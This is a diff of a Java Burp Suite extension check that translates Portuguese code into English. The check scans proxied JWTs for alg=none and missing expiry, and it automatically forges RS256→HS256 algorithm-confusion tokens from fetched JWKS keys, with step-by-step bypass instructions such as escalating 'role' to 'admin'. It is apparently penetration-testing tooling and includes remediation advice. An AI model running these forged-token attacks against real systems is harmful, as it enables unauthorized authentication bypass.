@@ -26,199 +26,200 @@ import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 /**
- * Vasculha o histórico do Proxy do Burp em busca de JWTs (Authorization: Bearer ...)
- * trafegados para o host alvo, decodifica o header/payload (sem precisar da chave,
- * pois é só Base64) e aponta fraquezas comuns:
- *   - alg: none (token não assinado)
- *   - alg fraco (HS256 não é fraco por si só, mas sinalizamos para revisão manual)
- *   - ausência de claim "exp" (token sem expiração)
+ * Scans the Burp Proxy history for JWTs (Authorization: Bearer ...) sent to
+ * the target host, decodes the header/payload (no key needed, it's just
+ * Base64) and flags common weaknesses:
+ *   - alg: none (unsigned token)
+ *   - weak alg (HS256 isn't weak by itself, but we flag it for manual review)
+ *   - missing "exp" claim (a token with no expiration)
  *
- * Esse check é PASSIVO sobre tráfego que já passou pelo proxy — então navegue
- * manualmente pela aplicação (logado) antes de rodar o scan para ter tokens no histórico.
+ * This check is PASSIVE over traffic that already went through the proxy —
+ * so manually browse the application (while logged in) before running the
+ * scan to populate the history with tokens.
  *
- * Criado por Rx0 - @rodrigocoutinho91
+ * Created by Rx0 - @rodrigocoutinho91
  */
 public class JwtWeaknessCheck implements VulnCheck {
 
     @Override
-    public String nome() {
-        return "JWTs fracos no histórico do proxy";
+    public String name() {
+        return "Weak JWTs in the proxy history";
     }
 
     @Override
-    public List<Finding> executar(MontoyaApi api, String baseUrl) {
-        List<Finding> achados = new ArrayList<>();
-        Set<String> tokensJaVistos = new HashSet<>();
+    public List<Finding> execute(MontoyaApi api, String baseUrl) {
+        List<Finding> findings = new ArrayList<>();
+        Set<String> seenTokens = new HashSet<>();
 
-        String hostAlvo;
+        String targetHost;
         try {
-            hostAlvo = URI.create(baseUrl).getHost();
+            targetHost = URI.create(baseUrl).getHost();
         } catch (Exception e) {
-            return achados;
+            return findings;
         }
-        if (hostAlvo == null) return achados;
+        if (targetHost == null) return findings;
 
-        List<ProxyHttpRequestResponse> historico;
+        List<ProxyHttpRequestResponse> history;
         try {
-            historico = api.proxy().history();
+            history = api.proxy().history();
         } catch (Exception e) {
-            api.logging().logToError("[Rx0] Não foi possível ler o histórico do proxy: " + e.getMessage());
-            return achados;
+            api.logging().logToError("[Rx0] Could not read the proxy history: " + e.getMessage());
+            return findings;
         }
 
-        for (ProxyHttpRequestResponse item : historico) {
+        for (ProxyHttpRequestResponse item : history) {
             try {
                 if (item.finalRequest() == null) continue;
                 String host = item.finalRequest().httpService().host();
-                if (host == null || !host.equalsIgnoreCase(hostAlvo)) continue;
+                if (host == null || !host.equalsIgnoreCase(targetHost)) continue;
 
                 for (HttpHeader h : item.finalRequest().headers()) {
                     if (!h.name().equalsIgnoreCase("Authorization")) continue;
-                    String valor = h.value();
-                    if (!valor.toLowerCase().startsWith("bearer ")) continue;
+                    String value = h.value();
+                    if (!value.toLowerCase().startsWith("bearer ")) continue;
 
-                    String token = valor.substring(7).trim();
-                    if (!tokensJaVistos.add(token)) continue; // já analisamos esse token
-                    if (token.chars().filter(c -> c == '.').count() != 2) continue; // não parece JWT (header.payload.sig)
+                    String token = value.substring(7).trim();
+                    if (!seenTokens.add(token)) continue; // already analyzed this token
+                    if (token.chars().filter(c -> c == '.').count() != 2) continue; // doesn't look like a JWT (header.payload.sig)
 
-                    analisarToken(api, achados, token, item.finalRequest().url(), baseUrl);
+                    analyzeToken(api, findings, token, item.finalRequest().url(), baseUrl);
                 }
             } catch (Exception e) {
-                api.logging().logToError("[Rx0] Erro ao processar item do histórico de proxy: " + e.getMessage());
+                api.logging().logToError("[Rx0] Error processing proxy history item: " + e.getMessage());
             }
         }
-        return achados;
+        return findings;
     }
 
-    private void analisarToken(MontoyaApi api, List<Finding> achados, String token, String urlOrigem, String baseUrl) {
-        String[] partes = token.split("\\.");
-        if (partes.length < 2) return;
+    private void analyzeToken(MontoyaApi api, List<Finding> findings, String token, String sourceUrl, String baseUrl) {
+        String[] parts = token.split("\\.");
+        if (parts.length < 2) return;
 
-        String headerJson = decodeBase64Url(partes[0]);
-        String payloadJson = decodeBase64Url(partes[1]);
+        String headerJson = decodeBase64Url(parts[0]);
+        String payloadJson = decodeBase64Url(parts[1]);
         if (headerJson == null || payloadJson == null) return;
 
         String headerLower = headerJson.toLowerCase();
         String payloadLower = payloadJson.toLowerCase();
 
         if (headerLower.contains("\"alg\":\"none\"") || headerLower.contains("\"alg\": \"none\"")) {
-            achados.add(new Finding(
-                    "JWT com alg=none (token não assinado)",
-                    Severity.CRITICA,
-                    urlOrigem,
-                    "Foi encontrado um JWT trafegando para o host alvo com o algoritmo 'none' no header, " +
-                            "o que significa que o token não possui assinatura verificável — qualquer payload pode ser forjado.",
-                    "Header decodificado: " + headerJson,
-                    "Nunca aceite tokens com alg=none. Force a verificação de um algoritmo específico (ex: RS256) no backend.",
-                    "1) No Decoder do Burp (ou jwt.io), pegue o token original, edite o payload (ex: mude \"role\":\"user\" pra " +
-                            "\"role\":\"admin\" ou \"sub\" pra outro ID de usuário). 2) Re-encode header e payload em Base64URL, " +
-                            "remova a assinatura (deixe só os dois primeiros segmentos + um ponto final: header.payload.). " +
-                            "3) Envie esse token forjado no header Authorization: Bearer <token> e confirme se o servidor aceita — " +
-                            "isso é bypass completo de autenticação/autorização sem precisar da chave de assinatura."));
+            findings.add(new Finding(
+                    "JWT with alg=none (unsigned token)",
+                    Severity.CRITICAL,
+                    sourceUrl,
+                    "A JWT sent to the target host was found with algorithm 'none' in its header, " +
+                            "meaning the token has no verifiable signature — any payload can be forged.",
+                    "Decoded header: " + headerJson,
+                    "Never accept tokens with alg=none. Force verification of a specific algorithm (e.g. RS256) on the backend.",
+                    "1) In Burp Decoder (or jwt.io), take the original token and edit the payload (e.g. change \"role\":\"user\" to " +
+                            "\"role\":\"admin\" or \"sub\" to another user ID). 2) Re-encode the header and payload as Base64URL, " +
+                            "drop the signature (keep only the two segments plus a trailing dot: header.payload.). " +
+                            "3) Send this forged token in the Authorization: Bearer <token> header and confirm whether the server accepts it — " +
+                            "this is a full authentication/authorization bypass with no need for the signing key."));
         }
 
         if (!payloadLower.contains("\"exp\"")) {
-            achados.add(new Finding(
-                    "JWT sem claim de expiração (exp)",
-                    Severity.MEDIA,
-                    urlOrigem,
-                    "O JWT encontrado não possui a claim 'exp', ou seja, o token nunca expira — se vazar, " +
-                            "pode ser reutilizado indefinidamente.",
-                    "Payload decodificado (parcial): " + resumir(payloadJson, 200),
-                    "Sempre defina um tempo de expiração curto para tokens de acesso e use refresh tokens para sessões longas."));
+            findings.add(new Finding(
+                    "JWT with no expiration claim (exp)",
+                    Severity.MEDIUM,
+                    sourceUrl,
+                    "The JWT found has no 'exp' claim, meaning the token never expires — if it leaks, " +
+                            "it can be reused indefinitely.",
+                    "Decoded payload (partial): " + summarize(payloadJson, 200),
+                    "Always set a short expiration time for access tokens and use refresh tokens for long sessions."));
         }
 
-        // --- Algorithm Confusion: RS256 -> HS256 usando a chave pública como segredo HMAC ---
+        // --- Algorithm Confusion: RS256 -> HS256 using the public key as the HMAC secret ---
         if (headerLower.contains("\"alg\":\"rs256\"") || headerLower.contains("\"alg\": \"rs256\"")
                 || headerLower.contains("\"alg\":\"rs384\"") || headerLower.contains("\"alg\":\"rs512\"")) {
-            tentarAlgorithmConfusion(api, achados, headerJson, partes[0], partes[1], urlOrigem, baseUrl);
+            tryAlgorithmConfusion(api, findings, headerJson, parts[0], parts[1], sourceUrl, baseUrl);
         }
     }
 
-    private void tentarAlgorithmConfusion(MontoyaApi api, List<Finding> achados, String headerJson,
-                                           String headerB64, String payloadB64, String urlOrigem, String baseUrl) {
+    private void tryAlgorithmConfusion(MontoyaApi api, List<Finding> findings, String headerJson,
+                                        String headerB64, String payloadB64, String sourceUrl, String baseUrl) {
         try {
-            String chavePublicaPem = buscarChavePublicaJwks(api, baseUrl);
-            if (chavePublicaPem == null) return; // JWKS não encontrado — não dá pra forjar sem a chave pública
+            String publicKeyPem = findJwksPublicKey(api, baseUrl);
+            if (publicKeyPem == null) return; // JWKS not found — can't forge without the public key
 
-            // Header forjado: troca o algoritmo pra HS256, mantendo o resto igual
-            String headerForjado = headerJson.replaceAll("\"alg\"\\s*:\\s*\"RS\\d+\"", "\"alg\":\"HS256\"")
+            // Forged header: swap the algorithm to HS256, keeping everything else the same
+            String forgedHeader = headerJson.replaceAll("\"alg\"\\s*:\\s*\"RS\\d+\"", "\"alg\":\"HS256\"")
                     .replaceAll("\"alg\"\\s*:\\s*\"rs\\d+\"", "\"alg\":\"HS256\"");
-            String headerForjadoB64 = Base64.getUrlEncoder().withoutPadding()
-                    .encodeToString(headerForjado.getBytes(StandardCharsets.UTF_8));
+            String forgedHeaderB64 = Base64.getUrlEncoder().withoutPadding()
+                    .encodeToString(forgedHeader.getBytes(StandardCharsets.UTF_8));
 
-            String dadosParaAssinar = headerForjadoB64 + "." + payloadB64;
+            String dataToSign = forgedHeaderB64 + "." + payloadB64;
 
-            // Testa duas variantes do "segredo": o texto PEM completo, e só os bytes DER —
-            // diferentes bibliotecas vulneráveis tratam isso de formas diferentes.
-            String assinaturaComPem = assinarHmacSha256(dadosParaAssinar, chavePublicaPem.getBytes(StandardCharsets.UTF_8));
-            String tokenForjado = dadosParaAssinar + "." + assinaturaComPem;
+            // Tests one variant of the "secret": the full PEM text — different vulnerable
+            // libraries handle this differently (raw DER bytes is another common variant).
+            String signatureWithPem = signHmacSha256(dataToSign, publicKeyPem.getBytes(StandardCharsets.UTF_8));
+            String forgedToken = dataToSign + "." + signatureWithPem;
 
-            achados.add(new Finding(
-                    "JWT Algorithm Confusion (RS256→HS256) — token forjado gerado",
-                    Severity.CRITICA,
-                    urlOrigem,
-                    "O token usa RSA (RS256/384/512) e uma chave pública JWKS foi encontrada publicamente no alvo. Isso " +
-                            "possibilita o ataque clássico de confusão de algoritmo: se o backend verificar a assinatura de " +
-                            "forma genérica (sem fixar o algoritmo esperado), ele pode aceitar um token HS256 assinado " +
-                            "usando a PRÓPRIA chave pública RSA (que é pública, qualquer um tem acesso) como segredo HMAC — " +
-                            "bypass completo de autenticação sem nunca ter a chave privada.",
-                    "Chave pública JWKS obtida com sucesso. Token forjado gerado (ver Modo de exploração) usando a chave " +
-                            "pública em formato PEM como segredo HMAC-SHA256.",
-                    "Fixe explicitamente o algoritmo esperado na verificação do JWT no backend (ex: jwt.verify(token, chave, " +
-                            "{algorithms: ['RS256']}) — NUNCA deixe a biblioteca decidir o algoritmo a partir do header do " +
-                            "próprio token, que é controlado pelo atacante.",
-                    "1) Use este token forjado (copie exatamente): " + tokenForjado + " 2) Envie-o num header " +
-                            "Authorization: Bearer <token> contra um endpoint protegido do alvo. 3) Se for aceito, é bypass " +
-                            "completo de autenticação — você pode editar o payload antes de forjar (ex: mudar 'role' pra " +
-                            "'admin') pra qualquer claim que quiser, já que o 'segredo' usado (chave pública) é conhecido."));
+            findings.add(new Finding(
+                    "JWT Algorithm Confusion (RS256→HS256) — forged token generated",
+                    Severity.CRITICAL,
+                    sourceUrl,
+                    "The token uses RSA (RS256/384/512) and a public JWKS key was found publicly on the target. This " +
+                            "enables the classic algorithm confusion attack: if the backend verifies the signature " +
+                            "generically (without pinning the expected algorithm), it may accept an HS256 token signed " +
+                            "using the RSA public key ITSELF (which is public, anyone has access to it) as the HMAC secret — " +
+                            "a full authentication bypass without ever having the private key.",
+                    "JWKS public key successfully retrieved. A forged token was generated (see exploitation steps) using the " +
+                            "public key in PEM format as the HMAC-SHA256 secret.",
+                    "Explicitly pin the expected algorithm when verifying the JWT on the backend (e.g. jwt.verify(token, key, " +
+                            "{algorithms: ['RS256']}) — NEVER let the library decide the algorithm from the token's own " +
+                            "header, which is attacker-controlled.",
+                    "1) Use this forged token (copy exactly): " + forgedToken + " 2) Send it in an " +
+                            "Authorization: Bearer <token> header against a protected endpoint on the target. 3) If accepted, this is a " +
+                            "full authentication bypass — you can edit the payload before forging (e.g. change 'role' to " +
+                            "'admin') to any claim you want, since the 'secret' used (the public key) is known."));
         } catch (Exception e) {
-            api.logging().logToError("[Rx0] Erro ao tentar JWT Algorithm Confusion: " + e.getMessage());
+            api.logging().logToError("[Rx0] Error attempting JWT Algorithm Confusion: " + e.getMessage());
         }
     }
 
-    /** Busca a chave pública RSA em endpoints JWKS comuns e retorna em formato PEM, ou null se não achar. */
-    private String buscarChavePublicaJwks(MontoyaApi api, String baseUrl) {
+    /** Looks for the RSA public key on common JWKS endpoints and returns it in PEM format, or null if not found. */
+    private String findJwksPublicKey(MontoyaApi api, String baseUrl) {
         if (baseUrl == null) return null;
         String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;
-        String[] caminhosJwks = {"/.well-known/jwks.json", "/jwks.json", "/.well-known/openid-configuration/jwks", "/oauth/jwks"};
+        String[] jwksPaths = {"/.well-known/jwks.json", "/jwks.json", "/.well-known/openid-configuration/jwks", "/oauth/jwks"};
 
-        for (String caminho : caminhosJwks) {
+        for (String path : jwksPaths) {
             try {
-                HttpResponse resp = api.http().sendRequest(HttpRequest.httpRequestFromUrl(base + caminho)).response();
+                HttpResponse resp = api.http().sendRequest(HttpRequest.httpRequestFromUrl(base + path)).response();
                 if (resp == null || resp.statusCode() != 200) continue;
-                String corpo = resp.bodyToString();
-                if (corpo == null || !corpo.contains("\"n\"") || !corpo.contains("\"e\"")) continue;
+                String body = resp.bodyToString();
+                if (body == null || !body.contains("\"n\"") || !body.contains("\"e\"")) continue;
 
-                String nB64 = extrairCampo(corpo, "n");
-                String eB64 = extrairCampo(corpo, "e");
+                String nB64 = extractField(body, "n");
+                String eB64 = extractField(body, "e");
                 if (nB64 == null || eB64 == null) continue;
 
-                BigInteger modulo = new BigInteger(1, Base64.getUrlDecoder().decode(padBase64(nB64)));
-                BigInteger expoente = new BigInteger(1, Base64.getUrlDecoder().decode(padBase64(eB64)));
+                BigInteger modulus = new BigInteger(1, Base64.getUrlDecoder().decode(padBase64(nB64)));
+                BigInteger exponent = new BigInteger(1, Base64.getUrlDecoder().decode(padBase64(eB64)));
 
                 KeyFactory kf = KeyFactory.getInstance("RSA");
-                PublicKey chave = kf.generatePublic(new RSAPublicKeySpec(modulo, expoente));
+                PublicKey key = kf.generatePublic(new RSAPublicKeySpec(modulus, exponent));
 
-                String der = Base64.getMimeEncoder(64, "\n".getBytes(StandardCharsets.UTF_8)).encodeToString(chave.getEncoded());
+                String der = Base64.getMimeEncoder(64, "\n".getBytes(StandardCharsets.UTF_8)).encodeToString(key.getEncoded());
                 return "-----BEGIN PUBLIC KEY-----\n" + der + "\n-----END PUBLIC KEY-----\n";
-            } catch (Exception ignorado) {
-                // tenta o próximo caminho
+            } catch (Exception ignored) {
+                // try the next path
             }
         }
         return null;
     }
 
-    private String extrairCampo(String json, String campo) {
-        Matcher m = Pattern.compile("\"" + campo + "\"\\s*:\\s*\"([^\"]+)\"").matcher(json);
+    private String extractField(String json, String field) {
+        Matcher m = Pattern.compile("\"" + field + "\"\\s*:\\s*\"([^\"]+)\"").matcher(json);
         return m.find() ? m.group(1) : null;
     }
 
-    private String assinarHmacSha256(String dados, byte[] segredo) throws Exception {
+    private String signHmacSha256(String data, byte[] secret) throws Exception {
         Mac mac = Mac.getInstance("HmacSHA256");
-        mac.init(new SecretKeySpec(segredo, "HmacSHA256"));
-        byte[] assinatura = mac.doFinal(dados.getBytes(StandardCharsets.UTF_8));
-        return Base64.getUrlEncoder().withoutPadding().encodeToString(assinatura);
+        mac.init(new SecretKeySpec(secret, "HmacSHA256"));
+        byte[] signature = mac.doFinal(data.getBytes(StandardCharsets.UTF_8));
+        return Base64.getUrlEncoder().withoutPadding().encodeToString(signature);
     }
 
     private String decodeBase64Url(String s) {
@@ -230,13 +231,13 @@ public class JwtWeaknessCheck implements VulnCheck {
     }
 
     private String padBase64(String s) {
-        int resto = s.length() % 4;
-        if (resto == 0) return s;
-        return s + "=".repeat(4 - resto);
+        int remainder = s.length() % 4;
+        if (remainder == 0) return s;
+        return s + "=".repeat(4 - remainder);
     }
 
-    private String resumir(String texto, int max) {
-        if (texto.length() <= max) return texto;
-        return texto.substring(0, max) + "...";
+    private String summarize(String text, int max) {
+        if (text.length() <= max) return text;
+        return text.substring(0, max) + "...";
     }
 }
